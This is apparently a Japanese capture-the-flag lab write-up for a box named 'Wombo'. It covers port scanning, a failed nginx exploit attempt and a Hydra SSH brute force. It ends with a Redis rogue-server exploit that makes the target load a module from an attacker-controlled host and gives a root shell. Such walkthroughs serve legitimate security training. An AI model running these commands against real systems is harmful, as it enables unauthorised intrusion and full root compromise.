# Wombo

## Nmap

### TCP port scan

```bash
$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.159.69 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

$ echo $ports
22,53,80,6379,8080,27017

$ nmap -p$ports -sV -A 192.168.159.69
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 19:20 JST
Nmap scan report for 192.168.159.69
Host is up (0.25s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=8r4hfIjcNU8SSZSLJw4QxbhL; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-gNkcx1mUXJw4/wc9XfkHVOlOPzc"
|     Vary: Accept-Encoding
|     Date: Sat, 07 May 2022 10:20:34 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=37lFH1MpqfZdLF36a6EHfn6g; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-V1mwWnTN2qo2OW98D4I6B9wcUQE"
|     Vary: Accept-Encoding
|     Date: Sat, 07 May 2022 10:20:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Sat, 07 May 2022 10:20:33 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-robots.txt: 3 disallowed entries
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
27017/tcp open   mongodb    MongoDB 4.0.18
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb:
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-databases:
|   codeName = Unauthorized
|   errmsg = command listDatabases requires authentication
|   code = 13
|_  ok = 0.0
| mongodb-info:
|   MongoDB Build info
|     buildEnvironment
|       distmod = debian92
|       distarch = x86_64
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       target_arch = x86_64
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       target_os = linux
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     modules
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     allocator = tcmalloc
|     sysInfo = deprecated
|     version = 4.0.18
|     javascriptEngine = mozjs
|     maxBsonObjectSize = 16777216
|     storageEngines
|       2 = mmapv1
|       1 = ephemeralForTest
|       0 = devnull
|       3 = wiredTiger
|     debug = false
|     bits = 64
|     versionArray
|       2 = 18
|       1 = 0
|       0 = 4
|       3 = 0
|     ok = 1.0
|   Server status
|     codeName = Unauthorized
|     errmsg = command serverStatus requires authentication
|     code = 13
|_    ok = 0.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=5/7%Time=627647F2%P=x86_64-pc-linux-gnu%r(Get
SF:Request,3494,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20off\
SF:r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX
SF:-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=bl
SF:ock\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Powered
SF:-By:\x20NodeBB\r\nset-cookie:\x20_csrf=37lFH1MpqfZdLF36a6EHfn6g;\x20Pat
SF:h=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x2018181\r\nETag:\x20W/\"4705-V1mwWnTN2qo2OW98D4I6B9wcUQE\"\r\nVary:\x2
SF:0Accept-Encoding\r\nDate:\x20Sat,\x2007\x20May\x202022\x2010:20:32\x20G
SF:MT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\
SF:"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r
SF:\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"
SF:viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;
SF:1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\
SF:x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capabl
SF:e\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\
SF:"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x20con
SF:tent")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Cont
SF:rol:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x2
SF:0noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201
SF:;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\
SF:r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20te
SF:xt/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-ZRA
SF:f8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sat,
SF:\x2007\x20May\x202022\x2010:20:33\x20GMT\r\nConnection:\x20close\r\n\r\
SF:nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Options:\x
SF:20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-Polic
SF:y:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\nset
SF:-cookie:\x20_csrf=8r4hfIjcNU8SSZSLJw4QxbhL;\x20Path=/\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:\x20
SF:W/\"2b5a-gNkcx1mUXJw4/wc9XfkHVOlOPzc\"\r\nVary:\x20Accept-Encoding\r\nD
SF:ate:\x20Sat,\x2007\x20May\x202022\x2010:20:34\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-dir=
SF:\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<title>
SF:Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\"\x2
SF:0content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x20/>\
SF:n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charset=UT
SF:F-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20conten
SF:t=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20content=
SF:\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.23 seconds
```

### UDP port scan

ウェルノウンポートで開いているポートは無い．

```bash
$ sudo nmap -Pn -sU --min-rate=10000 192.168.159.69
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 19:18 JST
Nmap scan report for 192.168.159.69
Host is up.
All 1000 scanned ports on 192.168.159.69 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

## HTTP - 80TCP

サイトにアクセスすると，nginxのデフォルトページが表示される．

![image-20220507205521801](/home/funa/.config/Typora/typora-user-images/image-20220507205521801.png)

nginx のバージョン `1.10.3` に脆弱性が無いか調べると，[Remote Integer Overflow Vulnerability](https://github.com/ninjabuster/exploit-nginx-1.10.3/blob/main/cve-nginx-1.10.3.py) が使えそう．

試しにコードを実行してみたが，脆弱ではないという結果が返ってきた．

```bash
$ python3 cve-nginx-1.10.3.py http://192.168.175.69/
INFO:__main__:target: http://192.168.175.69/
INFO:__main__:status: 200: Server: nginx/1.10.3
INFO:__main__:status: 200: Server: nginx/1.10.3
[!] Target not vulnerable: HTTP response code: 200
```

## SSH - 22TCP

ブルートフォースをしたが，ヒットしなかった．

```bash
$ cat username.txt
root
wombo

$ hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.175.69 ssh -V -t 24
<snip>
[REDO-ATTEMPT] target 192.168.175.69 - login "root" - pass "michelle" - 2023 of 2023 [child 6] (5/5)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-07 21:04:56
```

## MongoDB - 27017TCP

[27017,27018 - Pentesting MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)

## Redis - 6379TCP

[6379 - Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

redis のバージョン `5.0.9` の脆弱性を調べると [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) が見つかる．

```bash
$ python3 redis-rogue-server.py --rhost 192.168.175.69 --rport 6379 --lhost 192.168.49.175 --lport 6379
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.175.69:6379
[info] SERVER 192.168.49.175:6379
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[>>] root
[<<] id
[>>] uid=0(root) gid=0(root) groups=0(root)
[<<] cat /root/proof.txt
[>>] eaafabc8cd8826e6673fd68833fc10bd
```

Congratulations!
